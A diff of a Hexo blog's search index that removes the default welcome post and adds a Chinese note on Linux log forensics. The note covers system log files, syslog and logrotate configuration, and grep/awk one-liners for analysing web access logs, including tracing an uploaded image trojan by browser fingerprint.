@@ -1,24 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2020/11/09/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>铁三-WP</title>
     <url>/2020/11/09/%E9%93%81%E4%B8%89-WP/</url>
     <content><![CDATA[<h1 id="取证题目"><a href="#取证题目" class="headerlink" title="取证题目"></a>取证题目</h1><ol>
@@ -1783,5 +1765,382 @@ RE是些什么神仙题啊 js那个好像是KCTF的原题 已经恢复OPCODE了�
         <tag>博客园</tag>
         <tag>搬家</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>linux中log取证</title>
+    <url>/2021/04/22/linux%20%E7%9A%84%20log%20%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p>常见的Linux操作系统登录文件有如下几个：</p>
+<p>1）/var/log/secure：记录登录系统存取数据的文件;</p>
+<p>例如pop3，ssh，telnet，ftp等都会记录在此.</p>
+<p>2）/ar/log/wtmp：记录登录这的信息记录，被编码过，所以必须以last解析;</p>
+<p>3）/var/log/message:jihu所有的开机系统发生的错误都会在此记录;</p>
+<p>4）/var/log/boot.log：记录一些开机或者关机启动的一些服务显示的启动或者关闭的信息;</p>
+<p>5）/var/log/maillog：记录邮件的存取和往来;</p>
+<p>6）/var/log/cron：用来记录crontab这个服务的内容;</p>
+<p>7）/var/log/httpd，/var/log/mysqld.log等等文件，记录几个不同的网络服务的记录文件;</p>
+<p>8)/var/log/acpid ,   ACPI - Advanced Configuration and Power Interface，表示高级配置和电源管理接口。</p>
+<p>后面的 d 表示 deamon 。 acpid 也就是 the ACPI event daemon 。 也就是 acpi 的消息进程。用来控制、获取、管理 acpi 的状态的服务程序。</p>
+<p>9)/var/run/utmp 记录着现在登录的用户;</p>
+<p>10)/var/log/lastlog 记录每个用户最后的登录信息;</p>
+<p>11)/var/log/btmp 记录错误的登录尝试;</p>
+<p>12)/var/log/dmesg内核日志;</p>
+<p>13)/var/log/cpus CPU的处理信息；</p>
+<p>14）/var/log/syslog 事件记录监控程序日志；</p>
+<p>15）/var/log/auth.log 用户认证日志；</p>
+<p>16）/var/log/daemon.log 系统进程日志；</p>
+<p>17）/var/log/mail.err 邮件错误信息；</p>
+<p>18）/var/log/mail.info 邮件信息；</p>
+<p>19）/var/log/mail.warn 邮件警告信息；</p>
+<p>20)/var/log/daemon.log 系统监控程序产生的信息;</p>
+<p>21)/var/log/kern 内核产生的信息;</p>
+<p>22)/var/log/lpr   行打印机假脱机系统产生的信息;</p>
+<hr>
+<hr>
+<h1 id="如何查看linux系统下的各种日志文件-linux-系统日志的分析大全"><a href="#如何查看linux系统下的各种日志文件-linux-系统日志的分析大全" class="headerlink" title="如何查看linux系统下的各种日志文件 linux 系统日志的分析大全"></a>如何查看linux系统下的各种日志文件 linux 系统日志的分析大全</h1><p><strong>日志分类:</strong></p>
+<p><strong>1. 连接时间的日志</strong></p>
+<p><strong>连接时间日志一般由/var/log/wtmp和/var/run/utmp这两个文件记录，不过这</strong></p>
+<p><strong>两个文件无法直接cat查看，并且该文件由系统自动更新，可以通过如下：</strong></p>
+<p><strong>w/who/finger/id/last/lastlog/ac 进行查看</strong></p>
+<p>[root@xhot ~]# who</p>
+<p>root tty1 2010-10-06 22:56</p>
+<p>root pts/0 2010-10-06 22:26 (218.192.87.4)</p>
+<p>root pts/1 2010-10-06 23:41 (218.192.87.4)</p>
+<p>root pts/3 2010-10-06 23:18 (218.192.87.4)</p>
+<p>[root@xhot ~]# w</p>
+<p>01:01:02 up 2:36, 4 users, load average: 0.15, 0.03, 0.01</p>
+<p>USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT</p>
+<p>root tty1 - 22:56 1:20m 0.16s 0.16s -bash</p>
+<p>root pts/0 218.192.87.4 22:26 2:05m 0.18s 0.18s -bash</p>
+<p>root pts/1 218.192.87.4 23:41 0.00s 0.41s 0.00s w</p>
+<p>root pts/3 218.192.87.4 23:18 1:38m 0.03s 0.03s -bash</p>
+<p>[root@xhot ~]# ac -p //查看每个用户的连接时间</p>
+<p>u51 1.23</p>
+<p>u55 0.04</p>
+<p>root 95.21 //可以看到root连接时间最长吧</p>
+<p>xhot 0.06</p>
+<p>user1 3.93</p>
+<p>total 100.48</p>
+<p>[root@xhot ~]# ac -a //查看所有用户的连接时间</p>
+<p>total 100.49</p>
+<p>[root@xhot ~]# ac -d //查看用户每天的连接时间</p>
+<p>Sep 24 total 0.14</p>
+<p>Sep 25 total 14.60</p>
+<p>Sep 26 total 13.71</p>
+<p>Sep 27 total 21.47</p>
+<p>Sep 28 total 11.74</p>
+<p>Sep 29 total 6.60</p>
+<p>Sep 30 total 8.81</p>
+<p>Oct 1 total 9.04</p>
+<p>Oct 2 total 0.47 //可以看到我国庆3、4、5号出去玩了</p>
+<p>Oct 6 total 8.62</p>
+<p>Today total 5.29</p>
+<p>其他几个命令不做具体介绍了</p>
+<p><strong>2. 进程监控日志</strong></p>
+<p><strong>进程统计监控日志在监控用户的操作指令是非常有效的。当服务器最近发现经常</strong></p>
+<p><strong>无故关机或者无故被人删除文件等现象时，可以通过使用进程统计日志查看：</strong></p>
+<p>[root@xhot ~]# accton /var/account/pacct //开启进程统计日志监控</p>
+<p>[root@xhot ~]# lastcomm //查看进程统计日志情况</p>
+<p>accton S root pts/1 0.00 secs Thu Oct 7 01:20</p>
+<p>accton root pts/1 0.00 secs Thu Oct 7 01:20</p>
+<p>ac root pts/1 0.00 secs Thu Oct 7 01:14</p>
+<p>ac root pts/1 0.00 secs Thu Oct 7 01:14</p>
+<p>free root pts/1 0.00 secs Thu Oct 7 01:10</p>
+<p>lastcomm root pts/1 0.00 secs Thu Oct 7 01:09</p>
+<p>bash F root pts/1 0.00 secs Thu Oct 7 01:09</p>
+<p>lastcomm root pts/1 0.00 secs Thu Oct 7 01:09</p>
+<p>ifconfig root pts/1 0.00 secs Thu Oct 7 01:09</p>
+<p>lastcomm root pts/1 0.00 secs Thu Oct 7 01:09</p>
+<p>lastcomm root pts/1 0.00 secs Thu Oct 7 01:09</p>
+<p>lastcomm root pts/1 0.00 secs Thu Oct 7 01:09</p>
+<p>accton S root pts/1 0.00 secs Thu Oct 7 01:09</p>
+<p>[root@xhot ~]# accton //关闭进程统计日志监控</p>
+<p><strong>3. 系统和服务日志</strong></p>
+<p><strong>系统日志服务是由一个名为syslog的服务管理的，如一下日志文件都是由syslog日志服务驱动的：</strong></p>
+<p>/var/log/lastlog ：记录最后一次用户成功登陆的时间、登陆IP等信息</p>
+<p>/var/log/messages ：记录Linux操作系统常见的系统和服务错误信息</p>
+<p>/var/log/secure ：Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况</p>
+<p>/var/log/btmp ：记录Linux登陆失败的用户、时间以及远程IP地址</p>
+<p>/var/log/cron ：记录crond计划任务服务执行情况</p>
+<p>……</p>
+<p>[root@xhot ~]# cat /var/log/lastlog</p>
+<p>Lpts/0218.192.87.4</p>
+<p>Lpts/1218.192.87.4</p>
+<p>Lpts/1218.192.87.4</p>
+<p>Lpts/0218.192.87.46</p>
+<p>Lpts/0218.192.87.4</p>
+<p>……</p>
+<p><strong>Linux日志服务介绍</strong></p>
+<p><strong>１. 在Linux系统，大部分日志都是由syslog日志服务驱动和管理的</strong></p>
+<p>syslog服务由两个重要的配置文件控制管理，分别是/etc/syslog.conf主配置文件和/etc/sysconfig/syslog辅助</p>
+<p>配置文件， /etc/init.d/syslog是启动脚本，这里主讲主配置文件/etc/syslog.conf：</p>
+<p>/etc/syslog.conf 语句结构：</p>
+<p>[root@xhot ~]# grep -v “#” /etc/syslog.conf //列出非#打头的每一行</p>
+<p>*.info;mail.none;authpriv.none;cron.none /var/log/messages</p>
+<p>authpriv.* /var/log/secure</p>
+<p>mail.* -/var/log/maillog</p>
+<p>cron.* /var/log/cron</p>
+<p>*.emerg *</p>
+<p>uucp,news.crit /var/log/spooler</p>
+<p>local7.* /var/log/boot.log</p>
+<p>选择域(消息类型.错误级别) 动作域</p>
+<p><strong>２. 消息类型：</strong>auth,authpriv,security;cron,daemon,kern,lpr,mail, mark,news,syslog,user,uucp,local0~local7.</p>
+<p>错误级别：(8级)debug,info,notice,warning|warn;err|error;crit,alert,emerg|panic</p>
+<p>动作域：file,user,console,@remote_ip</p>
+<p>举如上的/etc/syslog.conf文件三个例子：</p>
+<p>*.info;mail.none;authpriv.none;cron.none /var/log/messages</p>
+<p>表示info级别的任何消息都发送到/var/log/messages日志文件，但邮件系统、验证系统</p>
+<p>和计划任务的错误级别信息就除外，不发送（none表示禁止）</p>
+<p>cron.* /var/log/cron 表示所有级别的cron信息发到/var/log/cron文件</p>
+<p>*.emerg * 表示emerg错误级别（危险状态）的所有消息类型发给所有用户</p>
+<p><strong>Linux日志服务器配置</strong></p>
+<p>此服务器的配置非常简单，只是修改一个文件的一个地方，然后重启服务即可：</p>
+<p>[root@xhot ~]# grep -v “#” /etc/sysconfig/syslog</p>
+<p>SYSLOGD_OPTIONS=”-m 0 -r” //只要在这里添加“-r”就行咯</p>
+<p>KLOGD_OPTIONS=”-x”</p>
+<p>SYSLOG_UMASK=077</p>
+<p>[root@xhot ~]# service syslog restart</p>
+<p>关闭内核日志记录器： [确定]</p>
+<p>关闭系统日志记录器： [确定]</p>
+<p>启动系统日志记录器： [确定]</p>
+<p>启动内核日志记录器： [确定]</p>
+<p>对于发送消息到服务器的OS，只要在写/etc/syslog.conf主配置文件的时候，作用域</p>
+<p>为@server-ip就行了，比如针对218.192.87.24这台日志服务器，把一台ubuntu系统的所有</p>
+<p>info级别的auth信息发给日志服务器，那么对于ubuntu系统的/etc/syslog.conf文件最后一</p>
+<p>行添加 auth.info @218.192.87.24 就OK了</p>
+<p><strong>日志转储服务</strong></p>
+<p>系统工作到了一定时间后，日志文件的内容随着时间和访问量的增加而越来越多，</p>
+<p>日志文件也越来越大。而且当日志文件超过系统控制范围时候，还会对系统性能</p>
+<p>造成影响。转储方式可以设为每年转储、每月转储、每周转储、达到一定大小转储。</p>
+<p>在Linux系统，经常使用<strong>“logrotate”</strong>工具进行日志转储，结合<strong>cron</strong>计划任务，可以轻松</p>
+<p>实现日志文件的转储。转储方式的设置由<strong>“/etc/logrotate.conf”</strong>配置文件控制：</p>
+<p>[root@xhot ~]# cat /etc/logrotate.conf</p>
+<h1 id="see-“man-logrotate”-for-details-可以查看帮助文档"><a href="#see-“man-logrotate”-for-details-可以查看帮助文档" class="headerlink" title="see “man logrotate” for details //可以查看帮助文档"></a>see “man logrotate” for details //可以查看帮助文档</h1><h1 id="rotate-log-files-weekly"><a href="#rotate-log-files-weekly" class="headerlink" title="rotate log files weekly"></a>rotate log files weekly</h1><p>weekly //设置每周转储</p>
+<h1 id="keep-4-weeks-worth-of-backlogs"><a href="#keep-4-weeks-worth-of-backlogs" class="headerlink" title="keep 4 weeks worth of backlogs"></a>keep 4 weeks worth of backlogs</h1><p>rotate 4 //最多转储4次</p>
+<h1 id="create-new-empty-log-files-after-rotating-old-ones"><a href="#create-new-empty-log-files-after-rotating-old-ones" class="headerlink" title="create new (empty) log files after rotating old ones"></a>create new (empty) log files after rotating old ones</h1><p>create //当转储后文件不存储时创建它</p>
+<h1 id="uncomment-this-if-you-want-your-log-files-compressed"><a href="#uncomment-this-if-you-want-your-log-files-compressed" class="headerlink" title="uncomment this if you want your log files compressed"></a>uncomment this if you want your log files compressed</h1><p>#compress //以压缩方式转储</p>
+<h1 id="RPM-packages-drop-log-rotation-information-into-this-directory"><a href="#RPM-packages-drop-log-rotation-information-into-this-directory" class="headerlink" title="RPM packages drop log rotation information into this directory"></a>RPM packages drop log rotation information into this directory</h1><p>include /etc/logrotate.d //其他日志文件的转储方式，包含在该目录下</p>
+<h1 id="no-packages-own-wtmp-–-we’ll-rotate-them-here"><a href="#no-packages-own-wtmp-–-we’ll-rotate-them-here" class="headerlink" title="no packages own wtmp – we’ll rotate them here"></a>no packages own wtmp – we’ll rotate them here</h1><p>/var/log/wtmp { //设置/var/log/wtmp日志文件的转储参数</p>
+<p>monthly //每月转储</p>
+<p>create 0664 root utmp //转储后文件不存在时创建它，文件所有者为root，</p>
+<p>所属组为utmp，对应的权限为0664</p>
+<p>rotate 1 //转储一次</p>
+<p>}</p>
+<h1 id="system-specific-logs-may-be-also-be-configured-here"><a href="#system-specific-logs-may-be-also-be-configured-here" class="headerlink" title="system-specific logs may be also be configured here."></a>system-specific logs may be also be configured here.</h1><p><strong>举两个例子：</strong></p>
+<p><strong>为/var/log/news/目录下的所有文件设置转储参数，每周转储，转储2次，转储</strong></p>
+<p><strong>时将老的日志文件放到/var/log/news/old目录下，若日志文件不存在，则跳过。完成后重启</strong></p>
+<p><strong>news新闻组服务，转储时不压缩</strong>。那么可以在/etc/logrotate.conf文件的最后添加如下：</p>
+<p>/var/log/news/*{</p>
+<p>monthly</p>
+<p>rotate 2</p>
+<p>olddir /var/log/news/old</p>
+<p>missingok</p>
+<p>postrotate</p>
+<p>kill -HUP <code>cat /var/run/inn.pid</code></p>
+<p>endscript</p>
+<p>nocompress</p>
+<p>}</p>
+<p>另一个例子：<strong>为/var/log/httpd/access.log和/var/log/httpd/error.log日志设置转储参数。转储</strong></p>
+<p><strong>5次，转储时发送邮件给</strong><a href="http://localhost/?fileGuid=6qXV8qwdW9djrVdp">root@localhost</a><strong>用户，当日志文件达到100KB时才转储，转储后重启</strong></p>
+<p><strong>httpd服务</strong>，那么可以直接在/etc/logrotate.conf文件的最后添加如下：</p>
+<p>/var/log/httpd/access.log /var/log/http/error.log{</p>
+<p>rotate 5</p>
+<p>mail<a href="http://localhost/?fileGuid=6qXV8qwdW9djrVdp">root@localhost</a></p>
+<p>size=100k</p>
+<p>sharedscripts</p>
+<p>/sbin/killall -HUP httpd</p>
+<p>endscript</p>
+<p>}</p>
+<p>自定义日志转储（/etc/logrotate.d/*）</p>
+<p>通过下面一个例子<strong>将所有类型错误级别为info的日志转储到/var/log/test.log日志文件中，并设置</strong></p>
+<p><strong>/var/log/test.log达到50KB后进行转储，转储10次，转储时压缩，转储后重启syslog服务</strong>：</p>
+<p><strong>1、修改/etc/syslog.conf文件使得如下：</strong></p>
+<p>[root@xhot ~]# tail -1 /etc/syslog.conf //查看该文件的最后一行</p>
+<p>*.info /var/log/test.log</p>
+<p><strong>2、重启syslog服务：</strong></p>
+<p>[root@xhot ~]# /sbin/service syslog restart</p>
+<p>关闭内核日志记录器： [确定]</p>
+<p>关闭系统日志记录器： [确定]</p>
+<p>启动系统日志记录器： [确定]</p>
+<p>启动内核日志记录器： [确定]</p>
+<p><strong>3、创建/etc/logrotate.d/test.log日志转储参数配置文件，添加如下：</strong></p>
+<p>[root@xhot ~]# vim /etc/logrotate.d/test.log</p>
+<p>[root@xhot ~]# cat /etc/logrotate.d/test.log</p>
+<p>/var/log/test.log{</p>
+<p>rotate 10</p>
+<p>size = 50k</p>
+<p>compress</p>
+<p>postrotate</p>
+<p>killall -HUP syslog</p>
+<p>endscript</p>
+<p>}</p>
+<p><strong>4、查看文件/etc/cron.daily/logrotate确保如下：</strong></p>
+<p>[root@xhot ~]# cat /etc/cron.daily/logrotate</p>
+<p>#!/bin/sh</p>
+<p>/usr/sbin/logrotate /etc/logrotate.conf</p>
+<p>EXITVALUE=$?</p>
+<p>if [ $EXITVALUE != 0 ]; then</p>
+<p>/usr/bin/logger -t logrotate “ALERT exited abnormally with [$EXITVALUE]”</p>
+<p>fi</p>
+<p>exit 0</p>
+<p><strong>5、查看转储后的文件</strong></p>
+<p>[root@xhot log]# pwd</p>
+<p>/var/log</p>
+<p>[root@xhot log]# ls test.log*</p>
+<p>…… //结果等要转储的时候会发现压缩文件和原本的test.log文件</p>
+<p>syslog是一个被UNIX和Linux广泛使用的日志系统，Linux系统中大部分的日志文件都是通过它进行管理的。本节将对syslog的功能及配置、日志文件的查看和管理，以及syslog中默认配置的日志文件进行介绍。</p>
+<p><strong>12.2.1 syslog简介</strong></p>
+<p>syslog是一个历史悠久的日志系统，几乎所有的UNIX和Linux操作系统都是采用syslog进行系统日志的管理和配置。Linux系统内核和许多程序会产生各种错误信息、警告信息和其他的提示信息。这些信息对管理员了解系统的运行状态是非常有用的，所以应该把它们写到日志文件中去。而执行这个过程的程序就是syslog。syslog可以根据信息的来源以及信息的重要程度将信息保存到不同的日志文件中，例如，为了方便查阅，可以把内核信息与其他信息分开，单独保存到一个独立的日志文件中。在默认的syslog配置下，日志文件通常都保存在“/var/log”目录下。syslog的守护进程为syslogd，系统启动时，默认会自动运行syslogd守护进程。</p>
+<p>如果要手工启动，可以使用如下命令：</p>
+<p>/sbin/syslogd</p>
+<p>在修改syslog配置后，需要重新启动syslogd守护进程才能使新的配置生效。其命令如下所示。</p>
+<h1 id="killall-HUP-syslogd"><a href="#killall-HUP-syslogd" class="headerlink" title="killall -HUP syslogd"></a>killall -HUP syslogd</h1><p>Red Hat Enterprise Linux 5.2安装后默认就已经在syslog中定义了一些日志文件，这些日志的位置以及它们的说明如表12.2所示。</p>
+<p>表12.2 默认配置syslog日志</p>
+<table>
+<thead>
+<tr>
+<th align="left">日 志 文 件</th>
+<th align="left">说    明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">/var/log/message</td>
+<td align="left">系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一</td>
+</tr>
+<tr>
+<td align="left">/var/log/secure</td>
+<td align="left">与安全相关的日志信息</td>
+</tr>
+<tr>
+<td align="left">/var/log/maillog</td>
+<td align="left">与邮件相关的日志信息</td>
+</tr>
+<tr>
+<td align="left">/var/log/cron</td>
+<td align="left">与定时任务相关的日志信息</td>
+</tr>
+<tr>
+<td align="left">/var/log/spooler</td>
+<td align="left">与UUCP和news设备相关的日志信息</td>
+</tr>
+<tr>
+<td align="left">/var/log/boot.log</td>
+<td align="left">守护进程启动和停止相关的日志消息<br></td>
+</tr>
+</tbody></table>
+<h2 id="0x01-Web日志"><a href="#0x01-Web日志" class="headerlink" title="0x01 Web日志"></a>0x01 Web日志</h2><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>
+<p>我们来看一条Apache的访问日志：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [11&#x2F;Jun&#x2F;2018:12:47:22 +0800] &quot;GET &#x2F;login.html HTTP&#x2F;1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;66.0.3359.139 Safari&#x2F;537.36&quot;</span><br></pre></td></tr></table></figure>
+<p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。<br>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p>
+<h2 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h2><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p>
+<p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
+<p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p>
+<p>常用分析工具：</p>
+<p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p>
+<p>Linux下，使用Shell命令组合查询分析。</p>
+<p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p>
+<p>Apache日志分析技巧：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line">2、查看当天有多少个IP访问：awk &#39;&#123;print $1&#125;&#39; log_file|sort|uniq|wc -l</span><br><span class="line">3、查看某一个页面被访问的次数：grep &quot;&#x2F;index.php&quot; log_file | wc -l</span><br><span class="line">4、查看每一个IP访问了多少个页面：awk &#39;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#39; log_file</span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：awk &#39;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#39; log_file | sort -n</span><br><span class="line">6、查看某一个IP访问了哪些页面：grep ^111.111.111.111 log_file| awk &#39;&#123;print $1,$7&#125;&#39;</span><br><span class="line">7、去掉搜索引擎统计当天的页面：awk &#39;&#123;print $12,$1&#125;&#39; log_file | grep ^&quot;Mozilla | awk &#39;&#123;print $2&#125;&#39; |sort | uniq | wc -l</span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:awk &#39;&#123;print $4,$1&#125;&#39; log_file | grep 21&#x2F;Jun&#x2F;2018:14 | awk &#39;&#123;print $2&#125;&#39;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h2><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p>
+<p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p>
+<p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p>
+<h3 id="1、定位攻击源"><a href="#1、定位攻击源" class="headerlink" title="1、定位攻击源"></a>1、定位攻击源</h3><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p>
+<p><img src="https://assets.smcdn.cn/docs/assets/paste_error_placeholder-b6c71c3140.png?fileGuid=6qXV8qwdW9djrVdp" alt="图片"></p>
+<p>浏览器指纹：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mozilla&#x2F;4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident&#x2F;7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</span><br></pre></td></tr></table></figure>
+<h3 id="2、搜索相关日志记录"><a href="#2、搜索相关日志记录" class="headerlink" title="2、搜索相关日志记录"></a>2、搜索相关日志记录</h3><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p>
+<p><img src="https://assets.smcdn.cn/docs/assets/paste_error_placeholder-b6c71c3140.png?fileGuid=6qXV8qwdW9djrVdp" alt="图片"></p>
+<p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A、攻击者访问首页和登录页B、攻击者访问MsgSjlb.aspx和MsgSebd.aspxC、攻击者访问Xzuser.aspxD、攻击者多次POST（怀疑通过这个页面上传模块缺陷）E、攻击者访问了图片木马</span><br></pre></td></tr></table></figure>
+<p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p>
+<h2 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h2><p>统计爬虫：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -E &#39;Googlebot|Baiduspider&#39;  &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk &#39;&#123; print $1 &#125;&#39; | sort | uniq</span><br></pre></td></tr></table></figure>
+<p>统计浏览器：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | grep -v -E &#39;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#39; | sort | uniq -c | sort -r -n | head -n 100</span><br></pre></td></tr></table></figure>
+<p>IP 统计：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &#39;23&#x2F;May&#x2F;2019&#39; &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk &#39;&#123;print $1&#125;&#39; | awk -F&#39;.&#39; &#39;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#39; | sort | uniq -c | sort -r -n | head -n 10   2206 219.136.134.13   1497 182.34.15.248   1431 211.140.143.100   1431 119.145.149.106   1427 61.183.15.179   1427 218.6.8.189   1422 124.232.150.171   1421 106.187.47.224   1420 61.160.220.252   1418 114.80.201.18</span><br></pre></td></tr></table></figure>
+<p>统计网段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk &#39;&#123;print $1&#125;&#39; | awk -F&#39;.&#39; &#39;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#39; | sort | uniq -c | sort -r -n | head -n 200</span><br></pre></td></tr></table></figure>
+<p>统计域名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat  &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk &#39;&#123;print $2&#125;&#39;|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure>
+<p>HTTP状态：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat  &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk &#39;&#123;print $9&#125;&#39;|sort|uniq -c|sort -rn|more5056585 3041125579 200   7602 400      5 301</span><br></pre></td></tr></table></figure>
+<p>URL 统计：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat  &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk &#39;&#123;print $7&#125;&#39;|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure>
+<p>文件流量统计：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk &#39;&#123;sum[$7]+&#x3D;$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#39;|sort -rn|moregrep &#39; 200 &#39; &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log |awk &#39;&#123;sum[$7]+&#x3D;$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#39;|sort -rn|more</span><br><span class="line">URL访问量统计：</span><br><span class="line">cat &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk &#39;&#123;print $7&#125;&#39; | egrep &#39;?|&amp;&#39; | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure>
+<p>脚本运行速度：</p>
+<p>查出运行速度最慢的脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -v 0$ &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | awk -F &#39;&quot; &#39; &#39;&#123;print $4&quot; &quot; $1&#125;&#39; web.log | awk &#39;&#123;print $1&quot; &quot;$8&#125;&#39; | sort -n -k 1 -r | uniq &gt; &#x2F;tmp&#x2F;slow_url.txt</span><br></pre></td></tr></table></figure>
+<p>IP, URL 抽取：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -f &#x2F;www&#x2F;logs&#x2F;access.2019-02-23.log | grep &#39;&#x2F;test.html&#39; | awk &#39;&#123;print $1&quot; &quot;$7&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
